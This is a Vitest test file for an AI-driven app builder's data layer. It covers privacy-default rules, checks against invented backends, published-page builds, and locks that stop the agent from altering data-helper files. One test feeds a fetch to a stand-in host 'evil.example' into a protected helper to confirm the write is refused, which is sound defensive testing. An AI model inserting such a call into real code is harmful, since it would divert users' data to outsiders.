// @vitest-environment node
import { describe, expect, it } from "vitest";

import { DATA_RULES_PATH, PRIVATE_RULE, parseDataRules, ruleFor } from "@/lib/app-data";
import { checkApp, dataIssues, namingProblem, pathProblem } from "@/server/agent/checks";
import { guideNames, loadGuides } from "@/server/agent/guides";
import { contextMessage, systemPrompt } from "@/server/agent/prompt";
import { DATA_HELPERS, starterFiles, withStarterHelpers } from "@/server/agent/template";
import { Workspace } from "@/server/agent/workspace";
import { buildPublishedApp } from "@/server/publish/build";

const messages = (files: Record<string, string>) => dataIssues(files).map((i) => i.message).join("\n");

describe("the rules file", () => {
  it("defaults to private: no file, nothing declared, or a name the rules object inherits", () => {
    expect(parseDataRules(undefined)).toEqual({ rules: {}, issues: [] });
    expect(ruleFor({}, "notes")).toEqual(PRIVATE_RULE);
    expect(ruleFor({}, "constructor")).toEqual(PRIVATE_RULE);
    expect(ruleFor({ notes: "something else" }, "notes")).toEqual(PRIVATE_RULE);
    expect(ruleFor({ posts: "public-read" }, "posts").read).toEqual(["anyone"]);
  });

  it("reports what's wrong with a bad file", () => {
    expect(parseDataRules("{").issues).toHaveLength(1);
    expect(parseDataRules("[]").issues).toHaveLength(1);
    expect(parseDataRules('{"collections":{"Bad Name":"private"}}').issues[0]).toContain("Bad Name");
    expect(parseDataRules('{"collections":{"notes":"everyone"}}').issues[0]).toContain("private");
    expect(parseDataRules('{"collections":{"notes":"private","posts":"public-read"}}')).toEqual({ rules: { notes: PRIVATE_RULE, posts: { ...PRIVATE_RULE, read: ["anyone"] } }, issues: [] });
  });
});

describe("what the agent is held to", () => {
  it("the starter passes its own checks, and its helper files are allowed where they are", () => {
    expect(checkApp(starterFiles()).errors).toEqual([]);
    for (const p of ["src/lib/db.ts", "src/lib/useDb.ts", DATA_RULES_PATH]) {
      expect(p in starterFiles(), p).toBe(true);
      expect(namingProblem(p), p).toBeNull();
    }
    expect(pathProblem(DATA_RULES_PATH)).toBeNull();
  });

  it("the agent can't write, edit, rename or delete the helpers, so it can't reroute visitors' data through them", () => {
    const ws = new Workspace(starterFiles());
    const helper = starterFiles()["src/lib/db.ts"];
    for (const p of ["src/lib/db.ts", "src/lib/useDb.ts"]) {
      for (const [tool, args] of [
        ["create_file", { path: p, content: 'fetch("https://evil.example")' }],
        ["edit_file", { path: p, edits: [{ search: "BASE", replace: "EVIL" }] }],
        ["delete_file", { path: p }],
        ["rename_file", { from: p, to: "src/lib/old.ts" }],
        ["rename_file", { from: "src/lib/format.ts", to: p }],
      ] as const) {
        expect(ws.execute(tool, JSON.stringify(args), "build").ok, `${tool} ${p}`).toBe(false);
      }
    }
    expect(ws.files["src/lib/db.ts"]).toBe(helper);
  });

  it("older projects get the helpers, without overwriting anything", () => {
    const old = withStarterHelpers({ "src/App.tsx": "x", [DATA_RULES_PATH]: '{"collections":{"a":"private"}}' });
    expect(old["src/lib/db.ts"]).toContain("__gb/data");
    expect(old[DATA_RULES_PATH]).toContain('"a"');
  });

  it("refuses an invented backend", () => {
    expect(messages({ "src/App.tsx": 'fetch("/api/notes", { method: "POST" })' })).toContain("no server");
    expect(messages({ "src/App.tsx": "await axios.post(`/api/save`, x)" })).toContain("no server");
    expect(messages({ "src/lib/save.ts": 'const url = "https://abc.supabase.co/rest/v1/x"' })).toContain("abc.supabase.co");
    expect(messages({ "src/App.tsx": 'send("https://my-app.firebaseio.com/x.json")' })).toContain("firebaseio.com");
    expect(messages({ "src/App.tsx": 'fetch("/__gb/data/v1/c/notes")' })).toContain("src/lib/db.ts");
  });

  it("leaves ordinary code alone", () => {
    expect(dataIssues({ "src/App.tsx": 'fetch("/assets/data.json"); fetch("https://forno.celo.org"); useCollection<Note>("notes"); collection("my_posts-2")' })).toEqual([]);
  });

  it("catches a bad collection name and a broken rules file while building", () => {
    expect(messages({ "src/App.tsx": 'useCollection<Note>("My Notes")' })).toContain("My Notes");
    expect(messages({ "src/App.tsx": 'collection("../x")' })).toContain("../x");
    expect(checkApp({ ...starterFiles(), [DATA_RULES_PATH]: '{"collections":{"a":"open"}}' }).ok).toBe(false);
  });

  it("the guide exists, says the safe thing, and the prompt no longer says there's no store", () => {
    expect(guideNames()).toContain("app-data");
    const guide = loadGuides("app-data").text;
    expect(guide).toContain('"private" equals {"read": ["writer"]}');
    expect(guide).toContain("never personal details");
    expect(guide).toContain("never more visible than the rule it was saved under");
    const prompt = systemPrompt("build");
    expect(prompt).toContain("src/lib/db.ts");
    expect(prompt).not.toContain("There is no backend or database");
    expect(loadGuides("forms-and-signup").text).not.toContain("no backend or database yet");
  });

  it("the data helpers don't cost context on turns, though the manifest still lists them", () => {
    const text = contextMessage({ files: starterFiles(), request: "save notes to the db" });
    expect(text).toContain("src/lib/db.ts");
    expect(text).not.toContain('<file path="src/lib/db.ts">');
    expect(text).not.toContain('<file path="src/lib/useDb.ts">');
    expect(text).toContain('<file path="src/lib/format.ts">');
  });

  it("no helper or guide text uses an em dash", () => {
    for (const p of ["src/lib/db.ts", "src/lib/useDb.ts"]) expect(starterFiles()[p]).not.toContain("\u2014");
    expect(loadGuides("app-data").text).not.toContain("\u2014");
  });
});

describe("the published page", () => {
  const app = {
    ...starterFiles(),
    "src/App.tsx": 'import { useDbSession, useCollection } from "./lib/useDb";\nexport default function App() { const s = useDbSession(); const n = useCollection("notes", { enabled: !!s.wallet, wallet: s.wallet }); return <p>{n.records.length}</p>; }',
  };

  it("carries the public id, so the helper uses the real API", async () => {
    const files = await buildPublishedApp({ files: app, assets: [], title: "T", hasUndeployedContracts: false, dataClientId: "gbc_abc" });
    expect(new TextDecoder().decode(files.find((f) => f.path === "index.html")!.bytes)).toContain('<meta name="goodbuild-data" content="gbc_abc"');
    expect(new TextDecoder().decode(files.find((f) => f.path.endsWith(".js"))!.bytes)).toContain("/__gb/data/v1");
  }, 60_000);

  it("without one the helper stays in preview mode", async () => {
    const files = await buildPublishedApp({ files: app, assets: [], title: "T", hasUndeployedContracts: false });
    expect(new TextDecoder().decode(files.find((f) => f.path === "index.html")!.bytes)).not.toContain("goodbuild-data");
  }, 60_000);
});

describe("projects made before D34", () => {
  it("get today's data helpers on their next turn, and nothing else they wrote changes", () => {
    const old = { ...starterFiles(), "src/lib/db.ts": "// the helper from last week", "src/App.tsx": "mine" };
    const next = withStarterHelpers(old);
    expect(next["src/lib/db.ts"]).toBe(DATA_HELPERS["src/lib/db.ts"]);
    expect(next["src/lib/db.ts"]).toContain('"create": "anyone"');
    expect(next["src/App.tsx"]).toBe("mine");
  });
});
